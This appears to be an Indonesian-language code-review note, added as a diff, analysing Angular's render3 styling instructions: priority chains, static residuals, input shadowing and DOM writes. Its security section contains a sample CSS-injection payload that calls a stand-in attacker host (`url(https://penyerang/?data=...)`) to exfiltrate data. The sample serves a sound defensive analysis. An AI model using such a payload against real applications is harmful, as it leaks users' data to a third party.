@@ -1,0 +1,162 @@
+SUBSISTEM 14 :: Styling render3 ([style], [class], [style.x], [class.x])
+Lokasi   : packages/core/src/render3/instructions/styling.ts,
+           packages/core/src/render3/node_manipulation.ts (applyStyling),
+           packages/core/src/render3/dom_node_manipulation.ts (tulis statis)
+Status   : SELESAI DIANALISIS
+Alasan   : dianalisis menyusul triase sink (SINK-TRIAGE.txt T-11) yang menemukan
+           empat pemanggil `unwrapSafeValue` di berkas ini yang belum dibaca
+==============================================================================
+
+MASALAH YANG DIPECAHKAN
+-----------------------
+Satu elemen bisa menerima nilai style/class dari banyak sumber sekaligus:
+
+    <div class="a b"                     <- statis dari template
+         [class]="expr"                  <- map binding
+         [class.c]="expr"                <- property binding
+         my-dir                          <- host binding directive
+         another-dir>                    <- host binding directive lain
+
+Semuanya bisa menyentuh properti yang SAMA. Jadi styling bukan sekadar "tulis
+nilai ke DOM", melainkan masalah RESOLUSI PRIORITAS. Aturannya:
+
+    template property binding  >  template map binding
+    >  host binding directive (urutan directive terbalik)
+    >  nilai statis
+
+Yang membuat rumit: nilai bisa berubah menjadi `undefined`, dan saat itu terjadi
+nilai harus JATUH KEMBALI ke sumber prioritas lebih rendah - bukan dihapus.
+
+STRUKTUR DATA: LINKED LIST PRIORITAS DI DALAM TData
+---------------------------------------------------
+Setiap instruksi styling memakai DUA slot binding:
+    slot n     nilai mentah dari aplikasi (untuk dirty checking)
+    slot n+1   nilai ternormalisasi + `TStylingRange`
+
+`TStylingRange` adalah bilangan terkemas berisi indeks tetangga `prev`/`next`
+dalam rantai prioritas, plus dua bit penanda "ada duplikat di arah ini".
+Rantai ini dibangun SEKALI pada `firstUpdatePass` (`stylingFirstUpdatePass`),
+lalu dipakai ulang oleh semua instance.
+
+`findStylingValue` menelusuri rantai itu dengan dua arah yang berbeda makna:
+  - arah NEXT (tNode != null): cari nilai berprioritas LEBIH TINGGI yang
+    menimpa nilai kita; berhenti begitu ketemu. Bila tidak ada, konsultasikan
+    `tNode.residualStyles`/`residualClasses`.
+  - arah PREV (tNode == null): cari nilai FALLBACK berprioritas lebih rendah;
+    telusuri sampai habis dan ambil yang terakhir ditemukan.
+
+Optimasi penting: bit duplikat pada `TStylingRange`. Bila sebuah properti tidak
+punya duplikat di arah tertentu, penelusuran dilewati sama sekali - kasus paling
+umum (satu binding per properti) berbiaya nol.
+
+`isStylingValuePresent` memusatkan definisi "punya pendapat": hanya `undefined`
+yang dianggap tidak berpendapat. `null` BERARTI "hapus properti ini", berbeda
+dari `undefined`.
+
+RESIDUAL & NILAI STATIS
+-----------------------
+Nilai statis tidak ikut dalam rantai linked list. Ia dikumpulkan ke
+`tNode.residualStyles`/`residualClasses` oleh `collectResidual`, yang menyapu
+`collectStylingFromDirectives` (host binding tiap directive) dan
+`collectStylingFromTAttrs` (atribut statis template). Ini dihitung sekali.
+
+`wrapInStaticStylingKey` menggabungkan bagian statis ke dalam `TStylingKey`
+sehingga instruksi yang sama bisa mengembalikan nilai statis ketika binding
+dinamisnya menjadi `undefined`.
+
+INPUT SHADOWING (`@Input('class')` / `@Input('style')`)
+--------------------------------------------------------
+Bila sebuah directive punya input bernama `class` atau `style` (kasus nyata:
+`NgClass`/`NgStyle`), directive itu "mencuri" binding tersebut. `checkStylingMap`
+mendeteksinya lewat `hasStylingInputShadow` lalu mengirim nilai ke input
+directive alih-alih ke DOM (`setDirectiveInputsWhichShadowsStyling`).
+Ada komentar penting di kode: berbeda dari ViewEngine, Angular tetap
+MENGGABUNGKAN bagian statis ke nilai yang dikirim ke directive, karena kalau
+tidak `[ngClass]` akan mengira kelas statis sudah dihapus.
+
+PENULISAN KE DOM
+----------------
+`applyStyling` (node_manipulation.ts:1110) adalah satu-satunya titik tulis:
+  - class  -> `renderer.addClass` / `removeClass`
+  - style  -> `renderer.setStyle(node, prop, value, flags)` / `removeStyle`
+  - `!important` dideteksi dari akhiran string lalu dipindah ke flag renderer,
+    karena nilai CSS harus bersih dari `!important` agar valid.
+  - properti ber-tanda hubung otomatis diberi flag `DashCase`.
+
+Nilai statis awal memakai jalur berbeda: `writeDirectStyle`/`writeDirectClass`
+(dom_node_manipulation.ts:115,130) menulis seluruh atribut `style`/`class`
+sekaligus. Komentarnya menjelaskan alasannya: "Used for writing initial values,
+so that static styling values do not pull in the style parser" - yaitu agar
+parser CSS bisa di-tree-shake pada aplikasi yang tidak memakai styling dinamis.
+
+CATATAN KEAMANAN (verifikasi lanjutan atas SINK-TRIAGE T-11)
+-------------------------------------------------------------
+Pertanyaan yang dijawab di sini: mengapa `unwrapSafeValue` dipanggil di jalur
+styling TANPA pemeriksaan tipe pembungkus?
+
+1. TIDAK ADA sanitizer di jalur ini sama sekali. `ɵɵstyleProp`/`ɵɵstyleMap`
+   tidak menerima parameter `SanitizerFn` (bandingkan dengan `ɵɵproperty` dan
+   `ɵɵattribute` yang menerimanya). Compiler memang memetakan
+   SecurityContext.STYLE -> `ɵɵsanitizeStyle` di resolve_sanitizers.ts:22,
+   tetapi pemetaan itu berlaku untuk binding properti/atribut biasa - BUKAN
+   untuk instruksi styling khusus.
+   Bukti empiris bahwa `ɵɵsanitizeStyle` bukan kode mati, melainkan dipakai
+   pada bentuk ATRIBUT (berkas ekspektasi kompilasi):
+     compiler-cli/test/compliance/test_cases/r3_view_compiler_bindings/
+       property_bindings/sanitization.js:8
+         ɵɵattribute("style", ctx.evil, ɵɵsanitizeStyle);
+   Jadi: `[attr.style]` DISANITASI, sedangkan `[style]`/`[style.x]` tidak.
+
+2. Alasannya terletak pada BENTUK PENULISAN. `renderer.setStyle(node, prop,
+   value)` menulis SATU properti CSS lewat CSSOM. Peramban mem-parse nilai
+   dalam konteks properti itu saja dan MEMBUANG nilai yang tidak valid, jadi
+   nilai seperti `red; background: url(...)` tidak bisa "keluar" menjadi
+   deklarasi tambahan. Ini berbeda dari `setAttribute('style', ...)` yang
+   menerima banyak deklarasi sekaligus - dan jalur itu hanya dipakai untuk
+   nilai STATIS dari compiler.
+
+3. `unwrapSafeValue` bersifat IDENTITAS untuk nilai biasa, sehingga
+   pemanggilannya hanya berpengaruh bila aplikasi sudah membungkus nilai lewat
+   `bypassSecurityTrustStyle`. Bahwa `SafeStyle` diterima di sini memang
+   disengaja: `warnInvalidStylePropValue` secara eksplisit memasukkan
+   `BypassType.Style` ke daftar nilai yang SAH (styling.ts:247), di samping
+   string, number, null, dan undefined.
+
+4. Sisa risiko yang jujur: injeksi CSS pada level SATU properti tetap mungkin
+   bila aplikasi mengikat data pengguna ke `[style.background]` - misalnya
+   `url(https://penyerang/?data=...)` untuk eksfiltrasi via permintaan gambar.
+   Ini bukan XSS dan bukan cacat framework, tetapi layak diketahui: konteks
+   STYLE tidak disanitasi PADA BENTUK INSTRUKSI STYLING (`[style]`/`[style.x]`).
+   Bentuk `[attr.style]` tetap melewati ɵɵsanitizeStyle - lihat butir 1.
+   Uji keterjangkauannya ada di analysis/SINK-REACHABILITY.txt R-06.
+
+DAFTAR FUNGSI YANG SUDAH DIPAHAMI
+---------------------------------
+[x] ɵɵstyleProp | packages/core/src/render3/instructions/styling.ts:83 | Instruksi [style.prop]; meneruskan ke checkStylingProperty dengan sufiks opsional (mis. 'px').
+[x] ɵɵclassProp | packages/core/src/render3/instructions/styling.ts:107 | Instruksi [class.name]; nilai boolean menentukan tambah/hapus kelas.
+[x] ɵɵstyleMap | packages/core/src/render3/instructions/styling.ts:134 | Instruksi [style] untuk objek/string; memakai parser style yang bisa di-tree-shake.
+[x] ɵɵclassMap | packages/core/src/render3/instructions/styling.ts:173 | Instruksi [class] untuk objek/string/array/Set.
+[x] styleStringParser | packages/core/src/render3/instructions/styling.ts:149 | Mem-parse string style menjadi KeyValueArray; dipisah agar tree-shakable.
+[x] classStringParser | packages/core/src/render3/instructions/styling.ts:195 | Mem-parse string kelas menjadi KeyValueArray.
+[x] checkStylingProperty | packages/core/src/render3/instructions/styling.ts:209 | Alokasi 2 slot binding, bangun rantai prioritas pada firstUpdatePass, lalu updateStyling bila nilai berubah.
+[x] checkStylingMap | packages/core/src/render3/instructions/styling.ts:282 | Versi map; mendeteksi input shadowing dan menggabungkan bagian statis sebelum menyerahkan nilai ke directive.
+[x] warnInvalidStylePropValue | packages/core/src/render3/instructions/styling.ts:242 | Peringatan dev untuk nilai style bertipe aneh; secara eksplisit menerima SafeStyle sebagai nilai sah.
+[x] stringifyInvalidStylePropValue | packages/core/src/render3/instructions/styling.ts:262 | Stringify defensif untuk pesan peringatan (nilai bisa punya getter yang melempar).
+[x] isInHostBindings | packages/core/src/render3/instructions/styling.ts:349 | Membedakan binding host dari binding template lewat expandoStartIndex.
+[x] stylingFirstUpdatePass | packages/core/src/render3/instructions/styling.ts:363 | Membangun linked list prioritas TStylingRange sekali per template.
+[x] wrapInStaticStylingKey | packages/core/src/render3/instructions/styling.ts:406 | Menyisipkan bagian statis ke dalam TStylingKey agar bisa menjadi nilai fallback.
+[x] getTemplateHeadTStylingKey | packages/core/src/render3/instructions/styling.ts:499 | Mengambil kunci kepala rantai milik template.
+[x] setTemplateHeadTStylingKey | packages/core/src/render3/instructions/styling.ts:564 | Memperbarui kunci kepala saat host binding menyisip di depan.
+[x] collectResidual | packages/core/src/render3/instructions/styling.ts:590 | Mengumpulkan nilai statis yang tidak ikut rantai menjadi residualStyles/residualClasses.
+[x] collectStylingFromDirectives | packages/core/src/render3/instructions/styling.ts:624 | Menyapu host binding seluruh directive pada node untuk nilai statis.
+[x] collectStylingFromTAttrs | packages/core/src/render3/instructions/styling.ts:664 | Membaca atribut statis template (class/style) dari TAttributes.
+[x] toStylingKeyValueArray | packages/core/src/render3/instructions/styling.ts:721 | Menormalkan nilai map (string/array/Set/objek) menjadi KeyValueArray terurut; melepas pembungkus SafeValue.
+[x] styleKeyValueArraySet | packages/core/src/render3/instructions/styling.ts:764 | Menyisipkan satu pasangan style ke KeyValueArray, melepas SafeValue.
+[x] classKeyValueArraySet | packages/core/src/render3/instructions/styling.ts:778 | Menyisipkan satu kelas ke KeyValueArray.
+[x] updateStylingMap | packages/core/src/render3/instructions/styling.ts:808 | Membandingkan KeyValueArray lama dan baru lalu menerapkan hanya selisihnya.
+[x] updateStyling | packages/core/src/render3/instructions/styling.ts:884 | Resolusi prioritas satu properti: cek penimpa berprioritas lebih tinggi, cari fallback bila nilai hilang, lalu tulis ke DOM.
+[x] findStylingValue | packages/core/src/render3/instructions/styling.ts:946 | Penelusuran rantai dua arah (next = cari penimpa, prev = cari fallback) termasuk konsultasi nilai residual.
+[x] isStylingValuePresent | packages/core/src/render3/instructions/styling.ts:1012 | Satu tempat yang mendefinisikan bahwa hanya `undefined` yang berarti "tidak berpendapat".
+[x] normalizeSuffix | packages/core/src/render3/instructions/styling.ts:1027 | Menambahkan satuan (px/em) dan melepas SafeValue; sengaja tidak menambah sufiks pada nilai kosong agar CSS tetap valid.
+[x] hasStylingInputShadow | packages/core/src/render3/instructions/styling.ts:1053 | Cek flag TNode: apakah ada directive yang mengambil alih input class/style.
+[x] applyStyling | packages/core/src/render3/node_manipulation.ts:1110 | Titik tulis DOM tunggal: addClass/removeClass atau setStyle/removeStyle, dengan penanganan !important dan DashCase.
